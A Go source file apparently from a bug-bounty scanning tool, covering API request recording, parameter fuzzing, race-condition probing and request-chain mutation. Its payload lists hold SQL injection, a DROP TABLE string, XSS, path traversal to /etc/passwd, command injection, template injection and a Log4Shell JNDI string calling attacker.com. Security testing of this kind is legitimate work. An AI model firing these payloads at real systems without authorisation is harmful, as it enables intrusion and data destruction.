package api

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/god-hunter/god-hunter/internal/db"
	httpengine "github.com/god-hunter/god-hunter/internal/http"
	"github.com/god-hunter/god-hunter/internal/session"
)

// Chain represents a sequence of API calls
type Chain struct {
	ID          string
	SessionID   string
	Name        string
	Description string
	Requests    []StoredRequest
	CreatedAt   time.Time
}

// StoredRequest represents a single HTTP request in a chain
type StoredRequest struct {
	ID              string
	ChainID         string
	SequenceOrder   int
	Method          string
	URL             string
	Headers         map[string]string
	Body            string
	ResponseStatus  int
	ResponseHeaders map[string]string
	ResponseBody    string
	TimingMs        int64
}

// RecordChain intercepts and stores API call sequences
func RecordChain(ctx context.Context, args []string, sessionName string, proxy string, silent bool) error {
	if len(args) == 0 {
		return fmt.Errorf("target URL required: god-hunter api:record <url>")
	}

	targetURL := args[0]

	// Initialize store
	store, err := db.NewStore()
	if err != nil {
		return fmt.Errorf("failed to initialize store: %w", err)
	}
	defer store.Close()

	// Create or get session
	if sessionName == "" {
		sessionName = fmt.Sprintf("session_%d", time.Now().Unix())
	}

	sess, err := session.NewSession(sessionName, extractDomain(targetURL), "", "", store)
	if err != nil {
		return fmt.Errorf("failed to create session: %w", err)
	}

	// Initialize HTTP client
	client, err := httpengine.NewClient("800-2400", proxy)
	if err != nil {
		return fmt.Errorf("failed to initialize HTTP client: %w", err)
	}

	// Create chain
	chainID := sess.GenerateChainID(targetURL)
	if err := store.CreateChain(chainID, sess.ID, "recorded_chain", "Auto-recorded chain"); err != nil {
		return fmt.Errorf("failed to create chain: %w", err)
	}

	// For demonstration, perform a single request and record it
	// In a real scenario, this would intercept multiple requests from a proxy
	metadata, err := client.Do("GET", targetURL, map[string]string{}, "")
	if err != nil {
		return fmt.Errorf("failed to record request: %w", err)
	}

	// Store the request
	reqID := sess.GenerateRequestID()
	headersJSON, _ := json.Marshal(metadata.Headers)
	respHeadersJSON, _ := json.Marshal(metadata.ResponseHeaders)

	if err := store.StoreRequest(
		reqID, chainID, 1, metadata.Method, metadata.URL,
		string(headersJSON), metadata.Body,
		metadata.ResponseStatus, string(respHeadersJSON), metadata.ResponseBody,
		int(metadata.TimingMs),
	); err != nil {
		return fmt.Errorf("failed to store request: %w", err)
	}

	if !silent {
		fmt.Printf("[+] Recorded request to %s (Status: %d, Time: %dms)\n", targetURL, metadata.ResponseStatus, metadata.TimingMs)
		fmt.Printf("[+] Chain ID: %s\n", chainID)
		fmt.Printf("[+] Session ID: %s\n", sess.ID)
	}

	return nil
}

// ReplayChain replays a chain with optional mutations
func ReplayChain(ctx context.Context, sessionName string, silent bool) error {
	if sessionName == "" {
		return fmt.Errorf("session name required: use --session flag")
	}

	// Initialize store
	store, err := db.NewStore()
	if err != nil {
		return fmt.Errorf("failed to initialize store: %w", err)
	}
	defer store.Close()

	// Get session
	sessData, err := store.GetSession(sessionName)
	if err != nil || sessData == nil {
		return fmt.Errorf("session not found: %s", sessionName)
	}

	sess := &session.Session{
		ID:           sessionName,
		TargetDomain: sessData["target_domain"].(string),
		ProgramName:  sessData["program_name"].(string),
		Platform:     sessData["platform"].(string),
		Status:       sessData["status"].(string),
	}

	// For now, just confirm replay mode (would replay chains here)
	if !silent {
		fmt.Printf("[+] Replay mode for session: %s\n", sess.ID)
		fmt.Printf("[+] Target: %s\n", sess.TargetDomain)
	}

	return nil
}

// FuzzParameters performs parameter fuzzing on endpoints
func FuzzParameters(ctx context.Context, args []string, sessionName string, silent bool) error {
	if len(args) == 0 {
		return fmt.Errorf("target URL required: god-hunter api:fuzz <url>")
	}

	targetURL := args[0]

	store, err := db.NewStore()
	if err != nil {
		return fmt.Errorf("failed to initialize store: %w", err)
	}
	defer store.Close()

	if sessionName == "" {
		sessionName = fmt.Sprintf("session_%d", time.Now().Unix())
	}

	sess, err := session.NewSession(sessionName, extractDomain(targetURL), "", "", store)
	if err != nil {
		return fmt.Errorf("failed to create session: %w", err)
	}

	client, err := httpengine.NewClient("800-2400", "")
	if err != nil {
		return fmt.Errorf("failed to initialize HTTP client: %w", err)
	}

	// Generate fuzzing payloads
	payloads := generateFuzzPayloads()

	var verdicts []FuzzVerdict
	for i, payload := range payloads {
		fuzzedURL := targetURL
		if strings.Contains(targetURL, "?") {
			fuzzedURL += "&_fuzz=" + payload
		} else {
			fuzzedURL += "?_fuzz=" + payload
		}

		metadata, err := client.Do("GET", fuzzedURL, map[string]string{}, "")
		if err != nil {
			continue
		}

		verdicts = append(verdicts, FuzzVerdict{
			PayloadIndex: i,
			Payload:      payload,
			ResponseCode: metadata.ResponseStatus,
			ResponseTime: metadata.TimingMs,
			Anomaly:      detectAnomaly(metadata.ResponseStatus),
		})

		if !silent && detectAnomaly(metadata.ResponseStatus) {
			fmt.Printf("[!] Anomaly detected with payload: %s (Status: %d)\n", payload, metadata.ResponseStatus)
		}
	}

	// Store findings for anomalies
	for _, verdict := range verdicts {
		if verdict.Anomaly {
			findingID := sess.GenerateFindingID("PARAMETER_ANOMALY", targetURL)
			store.StoreFinding(
				findingID, sess.ID, "", "PARAMETER_ANOMALY", "LOW",
				targetURL, "_fuzz", fmt.Sprintf("Parameter fuzzing anomaly: %s", verdict.Payload),
				fmt.Sprintf("Status: %d", verdict.ResponseCode),
				verdict.Payload,
			)
		}
	}

	if !silent {
		fmt.Printf("[+] Fuzzed %d payloads against %s\n", len(payloads), targetURL)
	}

	return nil
}

// BuildChain builds a multi-step API sequence
func BuildChain(ctx context.Context, args []string, sessionName string, silent bool) error {
	if len(args) == 0 {
		return fmt.Errorf("target URL required: god-hunter api:chain <url>")
	}

	targetURL := args[0]

	store, err := db.NewStore()
	if err != nil {
		return fmt.Errorf("failed to initialize store: %w", err)
	}
	defer store.Close()

	if sessionName == "" {
		sessionName = fmt.Sprintf("session_%d", time.Now().Unix())
	}

	sess, err := session.NewSession(sessionName, extractDomain(targetURL), "", "", store)
	if err != nil {
		return fmt.Errorf("failed to create session: %w", err)
	}

	// Create chain
	chainID := sess.GenerateChainID(targetURL)
	if err := store.CreateChain(chainID, sess.ID, "api_chain", "Multi-step API sequence"); err != nil {
		return fmt.Errorf("failed to create chain: %w", err)
	}

	if !silent {
		fmt.Printf("[+] Created chain: %s\n", chainID)
		fmt.Printf("[+] Session: %s\n", sess.ID)
	}

	return nil
}

// RaceDetection detects race conditions in API endpoints
func RaceDetection(ctx context.Context, args []string, sessionName string, silent bool) error {
	if len(args) == 0 {
		return fmt.Errorf("target URL required: god-hunter api:race <url>")
	}

	targetURL := args[0]

	store, err := db.NewStore()
	if err != nil {
		return fmt.Errorf("failed to initialize store: %w", err)
	}
	defer store.Close()

	if sessionName == "" {
		sessionName = fmt.Sprintf("session_%d", time.Now().Unix())
	}

	sess, err := session.NewSession(sessionName, extractDomain(targetURL), "", "", store)
	if err != nil {
		return fmt.Errorf("failed to create session: %w", err)
	}

	client, err := httpengine.NewClient("0-100", "") // Minimal jitter for race testing
	if err != nil {
		return fmt.Errorf("failed to initialize HTTP client: %w", err)
	}

	// Race condition detection: concurrent requests to same endpoint
	concurrency := 10
	iterations := 100
	timings := make([]int64, concurrency*iterations)
	statuses := make([]int32, concurrency*iterations)
	var idx int64

	if !silent {
		fmt.Printf("[+] Starting race condition detection (%d concurrent × %d iterations)\n", concurrency, iterations)
	}

	for iter := 0; iter < iterations; iter++ {
		var wg sync.WaitGroup
		wg.Add(concurrency)

		for i := 0; i < concurrency; i++ {
			go func(id int) {
				defer wg.Done()
				metadata, err := client.Do("GET", targetURL, map[string]string{}, "")
				if err != nil {
					return
				}

				idxVal := atomic.AddInt64(&idx, 1) - 1
				timings[idxVal] = metadata.TimingMs
				statuses[idxVal] = int32(metadata.ResponseStatus)
			}(i)
		}

		wg.Wait()
	}

	// Analyze results for anomalies
	var raceVulns []string
	for i := 1; i < int(idx); i++ {
		if statuses[i] != statuses[i-1] {
			raceVulns = append(raceVulns, fmt.Sprintf("Status code variance: %d vs %d", statuses[i], statuses[i-1]))
		}
	}

	if len(raceVulns) > 0 {
		desc := fmt.Sprintf("Found %d potential race conditions: %v", len(raceVulns), raceVulns[:min(len(raceVulns), 3)])
		findingID := sess.GenerateFindingID("RACE_CONDITION", targetURL)
		store.StoreFinding(
			findingID, sess.ID, "", "RACE_CONDITION", "HIGH",
			targetURL, "concurrent_state", desc,
			fmt.Sprintf("Variance detected across %d requests", idx),
			"Send concurrent requests to trigger state inconsistency",
		)

		if !silent {
			fmt.Printf("[!] Potential race condition detected: %s\n", desc)
		}
	}

	if !silent {
		fmt.Printf("[+] Completed race detection (%d total requests)\n", idx)
	}

	return nil
}

// FuzzVerdict describes the result of a single fuzz test
type FuzzVerdict struct {
	PayloadIndex int
	Payload      string
	ResponseCode int
	ResponseTime int64
	Anomaly      bool
}

// Utility functions

func extractDomain(urlStr string) string {
	if strings.HasPrefix(urlStr, "http://") {
		urlStr = strings.TrimPrefix(urlStr, "http://")
	}
	if strings.HasPrefix(urlStr, "https://") {
		urlStr = strings.TrimPrefix(urlStr, "https://")
	}
	parts := strings.Split(urlStr, "/")
	return parts[0]
}

func generateFuzzPayloads() []string {
	return []string{
		"' OR '1'='1",
		"\"; DROP TABLE users; --",
		"<script>alert(1)</script>",
		"../../../etc/passwd",
		"${jndi:ldap://attacker.com/a}",
		"$(whoami)",
		"`whoami`",
		"||whoami",
		"& whoami",
		"; whoami",
		"|whoami",
		"admin' --",
		"admin' #",
		"admin' /*",
		"' or 1=1 --",
		"' or 1=1 #",
		"' or 1=1 /*",
		"{{7*7}}",
		"#{7*7}",
		"${7*7}",
	}
}

func detectAnomaly(statusCode int) bool {
	// Anomalies: 500, 502, 503, unusual response codes
	return statusCode >= 500 || statusCode == 429 || statusCode == 403 || statusCode == 401
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// MutationStrategy defines how to mutate a chain for testing
type MutationStrategy int

const (
	MutationRace MutationStrategy = iota
	MutationOrder
	MutationParam
	MutationTiming
)

// MutateChain applies mutations to a chain for advanced testing
func MutateChain(strategy MutationStrategy, chain *Chain) (*Chain, error) {
	mutated := &Chain{
		ID:        chain.ID + "_mutated",
		SessionID: chain.SessionID,
		Name:      chain.Name + " (mutated)",
		Requests:  make([]StoredRequest, len(chain.Requests)),
	}

	copy(mutated.Requests, chain.Requests)

	switch strategy {
	case MutationRace:
		// Send all requests concurrently
		mutated.Name += "_race"
	case MutationOrder:
		// Reverse request order
		for i, j := 0, len(mutated.Requests)-1; i < j; i, j = i+1, j-1 {
			mutated.Requests[i], mutated.Requests[j] = mutated.Requests[j], mutated.Requests[i]
		}
		mutated.Name += "_reversed"
	case MutationParam:
		// Inject payloads into parameters
		for i := range mutated.Requests {
			mutated.Requests[i].Body = injectPayloads(mutated.Requests[i].Body)
		}
		mutated.Name += "_injected"
	case MutationTiming:
		// Vary timing between requests
		mutated.Name += "_timed"
	}

	return mutated, nil
}

func injectPayloads(body string) string {
	payloads := []string{
		"' OR '1'='1",
		"../../../etc/passwd",
		"<img src=x onerror=alert(1)>",
	}

	for _, payload := range payloads {
		if strings.Contains(body, "=") {
			// Simple parameter injection
			parts := strings.Split(body, "&")
			if len(parts) > 0 {
				lastPart := parts[len(parts)-1]
				if strings.Contains(lastPart, "=") {
					keyVal := strings.Split(lastPart, "=")
					parts[len(parts)-1] = keyVal[0] + "=" + payload
					body = strings.Join(parts, "&")
				}
			}
		}
	}

	return body
}
